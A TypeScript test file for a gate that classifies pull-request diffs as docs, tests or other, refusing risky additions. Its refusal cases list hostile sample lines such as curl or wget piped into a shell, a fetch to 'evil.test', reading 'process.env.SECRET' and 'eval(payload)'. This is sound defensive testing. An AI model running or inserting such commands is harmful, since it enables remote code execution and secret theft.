import { describe, expect, it } from 'vitest'
import { classifyChange, parsePatch } from './category.js'
import type { GateFile } from './types.js'

const file = (path: string, add: string[] = [], remove: string[] = [], extra: Partial<GateFile> = {}): GateFile => ({
  path,
  previousPath: null,
  status: 'modified',
  additions: add.length,
  deletions: remove.length,
  patch: ['@@ -1 +1 @@', ...remove.map((l) => `-${l}`), ...add.map((l) => `+${l}`)].join('\n'),
  binary: false,
  mode: '100644',
  ...extra,
})

const ALLOW = ['github.com', 'acme.dev']
const category = (...files: GateFile[]) => classifyChange(files, ALLOW).category

describe('parsePatch', () => {
  it('separates added and removed lines and skips file headers', () => {
    expect(parsePatch('--- a/x\n+++ b/x\n@@ -1 +1 @@\n-old\n+new\n context')).toEqual({ added: ['new'], removed: ['old'] })
  })
  it('handles a missing patch', () => {
    expect(parsePatch(null)).toEqual({ added: [], removed: [] })
  })
})

describe('classifyChange: docs', () => {
  it('accepts plain prose', () => {
    expect(category(file('docs/guide.md', ['Run the migrations first.']))).toBe('docs')
    expect(category(file('README.md', ['Hello']))).toBe('docs')
  })
  it('accepts links on the allowlist, including subdomains', () => {
    expect(category(file('docs/a.md', ['See https://github.com/acme/x and https://docs.acme.dev/y']))).toBe('docs')
  })
  it.each([
    ['a link off the allowlist', 'See https://evil.test/x'],
    ['a lookalike domain', 'See https://github.com.evil.test/x'],
    ['curl into a shell', 'Run: curl -fsSL https://github.com/x | sudo bash'],
    ['wget into a shell', 'wget -qO- https://github.com/x | sh'],
    ['curl into python', 'curl https://github.com/x | python3'],
    ['active HTML', '<script src="x.js"></script>'],
    ['an iframe', '<iframe src="x"></iframe>'],
    ['a data URI', '![x](data:image/png;base64,AAAA)'],
  ])('refuses %s', (_name, line) => {
    const out = classifyChange([file('docs/a.md', [line])], ALLOW)
    expect(out.category).toBe('other')
    expect(out.reasons.length).toBeGreaterThan(0)
  })
  it('does not treat a script or dependency list as docs', () => {
    expect(category(file('docs/setup.sh', ['echo hi']))).toBe('other')
    expect(category(file('requirements.txt', ['evil==1.0']))).toBe('other')
  })
  it('accepts a text file under docs', () => {
    expect(category(file('docs/notes.txt', ['Hello']))).toBe('docs')
  })
})

describe('classifyChange: tests', () => {
  it('accepts added cases', () => {
    expect(category(file('tests/a.test.ts', ['it("x", () => {', '  expect(1).toBe(1)', '})']))).toBe('tests')
    expect(category(file('src/lib/a.spec.ts', ['it("x", () => {', '})']))).toBe('tests')
  })
  it.each([
    ['environment access', 'console.log(process.env.SECRET)'],
    ['a network call', 'await fetch("https://evil.test")'],
    ['http.get', 'https.get("https://evil.test")'],
    ['a spawned process', 'execSync("curl x")'],
    ['eval', 'eval(payload)'],
    ['a skipped test', 'it.skip("rejects", () => {'],
    ['a focused test', 'it.only("x", () => {'],
    ['xit', 'xit("x", () => {'],
    ['a suppression', '// @ts-ignore'],
  ])('refuses %s', (_name, line) => {
    expect(category(file('tests/a.test.ts', [line]))).toBe('other')
  })
  it('refuses removing test cases or assertions', () => {
    expect(category(file('tests/a.test.ts', [], ['it("blocks", () => {', '})']))).toBe('other')
    expect(category(file('tests/a.test.ts', [], ['  expect(x).toThrow()']))).toBe('other')
  })
  it('allows renaming a case, since the count holds', () => {
    expect(category(file('tests/a.test.ts', ['it("new name", () => {'], ['it("old name", () => {']))).toBe('tests')
  })
  it('refuses deleting a test file', () => {
    expect(category(file('tests/a.test.ts', [], [], { status: 'removed' }))).toBe('other')
  })
  it('treats a test helper outside the test globs as code', () => {
    expect(category(file('src/lib/helper.ts', ['export const x = 1']))).toBe('other')
  })
})

describe('classifyChange: combined and renames', () => {
  it('reports docs and tests together', () => {
    expect(category(file('docs/a.md', ['x']), file('tests/a.test.ts', ['it("x", () => {', '})']))).toBe('docs_and_tests')
  })
  it('one code file makes the whole change other', () => {
    expect(category(file('docs/a.md', ['x']), file('src/a.ts', ['x']))).toBe('other')
  })
  it('a rename must have both ends inside the category', () => {
    expect(category(file('docs/a.md', [], [], { previousPath: 'src/a.ts', status: 'renamed' }))).toBe('other')
    expect(category(file('docs/a.md', [], [], { previousPath: 'docs/b.md', status: 'renamed' }))).toBe('docs')
  })
  it('an empty change is not in any category', () => {
    expect(category()).toBe('other')
  })
  it('a path escaping the repository is not in any category', () => {
    expect(category(file('../outside.md', ['x']))).toBe('other')
  })
})
